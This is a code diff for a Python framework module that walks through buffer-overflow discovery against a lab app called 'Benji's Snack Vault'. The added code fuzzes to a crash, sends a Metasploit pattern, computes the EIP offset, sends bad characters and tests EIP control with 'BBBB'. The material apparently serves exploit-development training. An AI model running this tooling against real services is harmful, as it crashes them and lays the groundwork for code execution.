@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 Benji's Snack Vault - App Analysis Module
-Cleaned-up discovery tool (fuzzing, pattern, offset, badchars, control test)
+Cleaned & guided discovery tool with proper restart verification
 """
 
 import socket
@@ -14,14 +14,14 @@ class BenjisSnackVaultAnalysis(BaseModule):
     def __init__(self):
         super().__init__()
         self.name = "benjis_snack_vault_analysis"
-        self.description = "Full discovery module: fuzzing, pattern, offset calculation, badchars, and control test"
+        self.description = "Guided discovery module: fuzz, pattern, offset, badchars, control test"
 
         self.options = {
             "RHOST": {"value": "192.168.107.132", "required": True, "description": "Target IP"},
             "RPORT": {"value": 9999, "required": True, "description": "Target port"},
             "PREFIX": {"value": "MEOW ", "required": True, "description": "Command prefix"},
             "MODE": {"value": "full", "required": True, "description": "full | fuzz | pattern | badchars | test_offset"},
-            "PATTERN_LENGTH": {"value": 3000, "required": False, "description": "Pattern length (auto-used in full mode)"},
+            "PATTERN_LENGTH": {"value": 3000, "required": False, "description": "Pattern length"},
             "OFFSET": {"value": 0, "required": False, "description": "Offset to EIP (auto-set in full mode)"},
             "CRLF": {"value": True, "required": False, "description": "Append \\r\\n"}
         }
@@ -29,13 +29,7 @@ class BenjisSnackVaultAnalysis(BaseModule):
     def show_help(self):
         print(colored("\n=== App Analysis Module ===", "yellow"))
         print("Recommended: set MODE full → run")
-        print("This runs the complete discovery chain with user confirmation.")
-        print("\nAvailable modes:")
-        print("  full          - Guided full analysis (fuzz → pattern → offset → badchars → test)")
-        print("  fuzz          - Only fuzz to find crash size")
-        print("  pattern       - Send pattern only")
-        print("  badchars      - Send badchars (requires OFFSET)")
-        print("  test_offset   - Test EIP control with BBBB")
+        print("This runs the full chain with restart verification.")
 
     def run(self):
         opts = {k: v["value"] for k, v in self.options.items()}
@@ -52,23 +46,22 @@ class BenjisSnackVaultAnalysis(BaseModule):
         elif mode == "test_offset":
             self._run_test_offset()
         else:
-            print(colored("[-] Unknown mode. Use 'full' for guided analysis.", "red"))
+            print(colored("[-] Unknown mode", "red"))
 
     # ===================================================================
-    # FULL GUIDED ANALYSIS (new main mode)
+    # GUIDED FULL ANALYSIS (main recommended mode)
     # ===================================================================
     def _run_full_analysis(self):
         print(colored("=== Starting Full App Analysis ===", "green"))
-        print("This will run: Fuzz → Pattern → Offset Calc → Badchars → Control Test")
         input("Press Enter to begin...")
 
         # 1. Fuzz
         self._run_fuzz()
-        input("\nPress Enter to continue to pattern...")
+        self._wait_for_target("Fuzz crashed the app. Re-launch Benji's Snack Vault.exe as Administrator\nand re-attach Immunity Debugger.")
 
         # 2. Pattern
         self._run_pattern()
-        input("\nPress Enter after noting EIP from Immunity...")
+        self._wait_for_target("Pattern crashed the app. Re-launch Benji's Snack Vault.exe as Administrator\nand re-attach Immunity Debugger.")
 
         # 3. Offset calculation
         eip = input(colored("Enter EIP from Immunity (8 hex digits): ", "yellow")).strip().upper()
@@ -77,30 +70,74 @@ class BenjisSnackVaultAnalysis(BaseModule):
             self.options["OFFSET"]["value"] = offset
             print(colored(f"[+] OFFSET auto-set to {offset}", "green"))
 
-        input("\nPress Enter to continue to badchars...")
-
         # 4. Badchars
         self._run_badchars()
 
-        input("\nPress Enter to run final EIP control test...")
+        # 5. Final test
         self._run_test_offset()
 
         print(colored("\n=== Full analysis complete! ===", "green"))
-        print("You can now switch to the exploit module.")
+        print("You can now use the exploit module.")
 
     # ===================================================================
-    # Individual modes (kept for flexibility)
+    # Helper: Wait for target to be back online
+    # ===================================================================
+    def _wait_for_target(self, message):
+        print(colored(f"\nIMPORTANT: {message}", "red"))
+        print("Press Enter when the app is running and listening again.")
+        
+        while True:
+            input("Ready? (press Enter to test connection)")
+            if self._test_connection():
+                print(colored("[+] Target is responding — continuing...", "green"))
+                return
+            print(colored("[-] Still can't connect. Please restart the app and try again.", "red"))
+
+    def _test_connection(self):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(2)
+            s.connect((self.options["RHOST"]["value"], int(self.options["RPORT"]["value"])))
+            s.close()
+            return True
+        except:
+            return False
+
+    # ===================================================================
+    # Individual steps (kept simple)
     # ===================================================================
     def _run_fuzz(self):
-        print(colored("[*] Fuzzing mode", "yellow"))
-        # ... (your existing fuzz code here - I can add it if you want)
+        print(colored("[*] Fuzzing...", "yellow"))
+        for size in range(100, 5000, 200):
+            payload = self.options["PREFIX"]["value"].encode() + (b"A" * size) + b"\r\n"
+            print(f"  Sending {size} junk bytes...", end="", flush=True)
+            if self._send_payload(payload):
+                print(" OK")
+            else:
+                print(colored(" CRASH!", "red"))
+                print(colored(f"[!] Crash around {size} junk bytes", "green"))
+                break
+            time.sleep(0.2)
 
     def _run_pattern(self):
-        print(colored("[*] Pattern mode", "yellow"))
-        # ... (existing pattern code)
+        length = int(self.options["PATTERN_LENGTH"]["value"])
+        print(colored(f"[*] Sending {length}-byte pattern...", "yellow"))
+        try:
+            pattern = subprocess.check_output(
+                ["/usr/share/metasploit-framework/tools/exploit/pattern_create.rb", "-l", str(length)],
+                text=True
+            ).strip().encode()
+        except Exception as e:
+            print(colored(f"[-] Failed to generate pattern: {e}", "red"))
+            return
+
+        payload = self.options["PREFIX"]["value"].encode() + pattern + b"\r\n"
+        if self._send_payload(payload):
+            print(colored("[+] Pattern sent successfully", "green"))
+        else:
+            print(colored("[!] Send failed", "red"))
 
     def _calc_offset(self, eip_hex, length):
-        # Uses official pattern_offset.rb - guaranteed match
         try:
             result = subprocess.check_output(
                 ["/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb", "-q", eip_hex, "-l", str(length)],
@@ -115,12 +152,37 @@ class BenjisSnackVaultAnalysis(BaseModule):
         return None
 
     def _run_badchars(self):
-        print(colored("[*] Badchars mode", "yellow"))
-        # ... (existing badchars code)
+        offset = int(self.options["OFFSET"]["value"])
+        if offset == 0:
+            print(colored("[-] OFFSET not set", "red"))
+            return
+        print(colored("[*] Sending badchars...", "yellow"))
+        badchars = bytearray(b for b in range(1, 256) if b not in [0x00, 0x09, 0x0a, 0x0d])
+        payload = self.options["PREFIX"]["value"].encode() + (b"A" * offset) + b"BBBB" + badchars + b"\r\n"
+        self._send_payload(payload)
+        print(colored("[+] Badchars sent. Check ESP dump in Immunity.", "green"))
 
     def _run_test_offset(self):
-        print(colored("[*] Testing EIP control", "yellow"))
-        # ... (existing test_offset code)
+        offset = int(self.options["OFFSET"]["value"])
+        if offset == 0:
+            print(colored("[-] OFFSET not set", "red"))
+            return
+        print(colored("[*] Testing EIP control...", "yellow"))
+        payload = self.options["PREFIX"]["value"].encode() + (b"A" * offset) + b"BBBB" + (b"C" * 300) + b"\r\n"
+        self._send_payload(payload)
+        print(colored("[+] Sent. Check if EIP = 42424242 in Immunity.", "green"))
+
+    def _send_payload(self, payload):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(3)
+            s.connect((self.options["RHOST"]["value"], int(self.options["RPORT"]["value"])))
+            s.send(payload)
+            s.close()
+            return True
+        except Exception as e:
+            print(colored(f"[!] Connection failed: {e}", "red"))
+            return False
 
     def handle_command(self, cmd):
         if cmd.strip().lower() == "run":
